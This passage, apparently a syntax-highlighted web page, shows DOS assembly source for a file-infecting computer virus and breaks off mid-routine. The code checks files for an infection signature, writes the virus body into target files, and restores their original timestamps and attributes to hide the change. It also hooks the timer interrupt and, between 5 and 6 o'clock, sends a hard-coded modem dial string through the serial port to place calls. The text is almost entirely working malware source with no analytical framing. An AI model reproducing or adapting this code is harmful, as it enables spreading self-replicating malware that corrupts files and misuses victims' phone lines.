</span><span class="sc5">test_sig</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; take the byte pointed to by SI</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; and compare it with the byte</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                   </span><span class="sc1">; pointed to by DI</span><span class="sc0">
                            </span><span class="sc6">jne</span><span class="sc0">         </span><span class="sc5">virit</span><span class="sc0">                                   </span><span class="sc1">; if not equal then it is clean!</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; else increase 1st pointer</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">; increase 2nd pointer</span><span class="sc0">
                            </span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">test_sig</span><span class="sc0">                            </span><span class="sc1">; continue with next if CX&gt;0</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">closeit</span><span class="sc0">

</span><span class="sc5">virit</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                            </span><span class="sc1">; Code for LSEEK (Start)</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc0">                    </span><span class="sc1">; Handle num in BX</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                   </span><span class="sc1">; Reset CX</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                   </span><span class="sc1">; and DX</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do the call</span><span class="sc0">
                            </span><span class="sc6">jc</span><span class="sc0">          </span><span class="sc5">closeit</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">             
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_buffer</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">virusin</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc0">
                            </span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">virusin</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filetime</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filedate</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                          

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_buffer</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                            </span><span class="sc6">add</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                   </span><span class="sc1">; DX points to Buffer (file)</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filesize</span><span class="sc0">              </span><span class="sc1">; Size of file in CX</span><span class="sc0">
                            </span><span class="sc6">add</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virlen</span><span class="sc0">                           </span><span class="sc1">; But added by Virlen</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc0">                    </span><span class="sc1">; File handle num in BX</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">; Code for WRITE FILE</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do the call</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filetime</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filedate</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">closeit</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">handle</span><span class="sc0">                    </span><span class="sc1">; Handle in BX</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                              </span><span class="sc1">; Code for CLOSE FILE</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do close it</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc0">  
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">resdta</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                              </span><span class="sc1">; Reset the DTA</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                              </span><span class="sc1">; in Address 80H</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">; Do call</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_buffer</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">

                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fileds</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filedx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">attr</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">invdrive</span><span class="sc0">                            </span><span class="sc1">; and exit</span><span class="sc0">
</span><span class="sc5">nomatch</span><span class="sc4">:</span><span class="sc0">            
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">                                      
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notinfect</span><span class="sc0">

</span><span class="sc5">invdrive</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">notinfect</span><span class="sc4">:</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">; restore registers</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">es</span><span class="sc0">                                      </span><span class="sc1">; to their initial </span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">bp</span><span class="sc0">                                      </span><span class="sc1">; values</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">do_oldint</span><span class="sc0">                           </span><span class="sc1">; return from call </span><span class="sc0">
</span><span class="sc5">infector</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">newint8</span><span class="sc0">             </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc10">far</span><span class="sc0">                                     </span><span class="sc1">; VIRUS' TIMER ISR</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">bp</span><span class="sc0">                                      </span><span class="sc1">; </span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">; store all registers</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">es</span><span class="sc0">                                      </span><span class="sc1">; and flags before</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">; the new timer </span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">bx</span><span class="sc0">                                      </span><span class="sc1">; operations.</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">cx</span><span class="sc0">                                      </span><span class="sc1">; Otherwize a 'crush'</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; is unavoidable</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">;   </span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">;       </span><span class="sc0">
                            </span><span class="sc6">pushf</span><span class="sc0">                                                   </span><span class="sc1">; Simulate an INT</span><span class="sc0">
                            </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">oldint8a</span><span class="sc0">   </span><span class="sc1">; Do old timer stuff</span><span class="sc0">
                            </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">tick</span><span class="sc0">                                    </span><span class="sc1">; update virus clock routine</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                    </span><span class="sc1">; Check if time</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">cur_h</span><span class="sc0">                            </span><span class="sc1">; is now above the</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                                   </span><span class="sc1">; lower limit (5 o'clock)</span><span class="sc0">
                            </span><span class="sc6">ja</span><span class="sc0">          </span><span class="sc5">exitpoint</span><span class="sc0">                           </span><span class="sc1">; if not, exit</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                                    </span><span class="sc1">; Check if time</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                                   </span><span class="sc1">; is now below the higher limit</span><span class="sc0">
                            </span><span class="sc6">jb</span><span class="sc0">          </span><span class="sc5">exitpoint</span><span class="sc0">                           </span><span class="sc1">; if not, exit</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">status</span><span class="sc0">                           </span><span class="sc1">; get the virus status</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                    </span><span class="sc1">; test if call in progress</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">in_progress</span><span class="sc0">                     </span><span class="sc1">; if yes goto countdown routine</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                    </span><span class="sc1">; if not, set the status to </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">status</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">; indicate 'In progress'</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">exitpoint</span><span class="sc0">                           </span><span class="sc1">; and exit</span><span class="sc0">
</span><span class="sc5">in_progress</span><span class="sc4">:</span><span class="sc0">                                                                </span><span class="sc1">; CALL IS IN PROGRESS!</span><span class="sc0">
                            </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">dial</span><span class="sc0">                                    </span><span class="sc1">; else call dial routine</span><span class="sc0">
                            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc5">count</span><span class="sc0">                           </span><span class="sc1">; CALL_TIMER</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">count</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">540</span><span class="sc0">                              </span><span class="sc1">; check for time-out</span><span class="sc0">
                            </span><span class="sc6">jne</span><span class="sc0">         </span><span class="sc5">exitpoint</span><span class="sc0">                           </span><span class="sc1">; if not, exit else </span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">; set status to indicate</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">status</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">; 'ready to call'!</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">count</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">; reset call_timer </span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">call_made</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">exitpoint</span><span class="sc4">:</span><span class="sc0">  
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">di</span><span class="sc0">                                      </span><span class="sc1">; restore registers to </span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">si</span><span class="sc0">                                      </span><span class="sc1">; their values and</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc0">                                      </span><span class="sc1">; </span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">bx</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">es</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">bp</span><span class="sc0">                                      </span><span class="sc1">;   </span><span class="sc0">
                            </span><span class="sc6">iret</span><span class="sc0">                                                    </span><span class="sc1">; return to program</span><span class="sc0">
</span><span class="sc5">newint8</span><span class="sc0">             </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tick</span><span class="sc0">                    </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc10">near</span><span class="sc0">                                    </span><span class="sc1">; VIRUS' CLOCK ROUTINE</span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
                            </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">cs</span><span class="sc0">
                            </span><span class="sc6">pop</span><span class="sc0">         </span><span class="sc8">ds</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">ticks</span><span class="sc0">                            </span><span class="sc1">; test if ticks have</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">17</span><span class="sc0">                                   </span><span class="sc1">; reached limit (17)</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">incticks</span><span class="sc0">                            </span><span class="sc1">; if no, incerase ticks</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">cur_s</span><span class="sc0">                            </span><span class="sc1">; test if seconds have</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">59</span><span class="sc0">                                   </span><span class="sc1">; reached limit (59)</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">incsec</span><span class="sc0">                              </span><span class="sc1">; if no, increase seconds</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">cur_m</span><span class="sc0">                            </span><span class="sc1">; test if minutes have</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">59</span><span class="sc0">                                   </span><span class="sc1">; reached limit (59)</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">incmin</span><span class="sc0">                              </span><span class="sc1">; if no, increase minutes</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">cur_h</span><span class="sc0">                            </span><span class="sc1">; test if hours have</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc0">                                   </span><span class="sc1">; reached limit (23)</span><span class="sc0">
                            </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">inchour</span><span class="sc0">                             </span><span class="sc1">; if no, increase hours</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">cur_h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                            </span><span class="sc1">; else reset hours</span><span class="sc0">
</span><span class="sc5">exitp3</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">cur_m</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                            </span><span class="sc1">; reset minutes</span><span class="sc0">
</span><span class="sc5">exitp2</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">cur_s</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                            </span><span class="sc1">; reset seconds</span><span class="sc0">
</span><span class="sc5">exitp1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc5">ticks</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                            </span><span class="sc1">; reset ticks</span><span class="sc0">
                            </span><span class="sc6">ret</span><span class="sc0">                                                     </span><span class="sc1">; end exit</span><span class="sc0">
</span><span class="sc5">incticks</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc5">ticks</span><span class="sc0">                                   </span><span class="sc1">; increase ticks</span><span class="sc0">
                            </span><span class="sc6">ret</span><span class="sc0">                                                     </span><span class="sc1">; and exit</span><span class="sc0">
</span><span class="sc5">incsec</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc5">cur_s</span><span class="sc0">                                   </span><span class="sc1">; increase seconds</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">exitp1</span><span class="sc0">                              </span><span class="sc1">; and exit</span><span class="sc0">
</span><span class="sc5">incmin</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc5">cur_m</span><span class="sc0">                                   </span><span class="sc1">; increase minutes</span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">exitp2</span><span class="sc0">                              </span><span class="sc1">; and exit</span><span class="sc0">
</span><span class="sc5">inchour</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc5">cur_h</span><span class="sc0">                                   </span><span class="sc1">; increase hours </span><span class="sc0">
                            </span><span class="sc6">jmp</span><span class="sc0">         </span><span class="sc5">exitp3</span><span class="sc0">                              </span><span class="sc1">; end exit</span><span class="sc0">
</span><span class="sc5">tick</span><span class="sc0">                    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">startstr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">string</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc12">'+++aTh0m0s7=35dp081,,,,141'</span><span class="sc0">
</span><span class="sc5">endstr</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">dial</span><span class="sc0">                    </span><span class="sc9">proc</span><span class="sc0">        </span><span class="sc10">near</span><span class="sc0">
                            </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
                            
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">call_made</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">exit_dial</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">init_done</span><span class="sc0">
                            </span><span class="sc6">cmp</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                            </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">send_one</span><span class="sc0">
                            
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">next_init</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                            </span><span class="sc6">xor</span><span class="sc0">         </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc0">
                            </span><span class="sc6">int</span><span class="sc0">         </span><span class="sc2">14h</span><span class="sc0">
                            </span><span class="sc6">loop</span><span class="sc0">        </span><span class="sc5">next_init</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
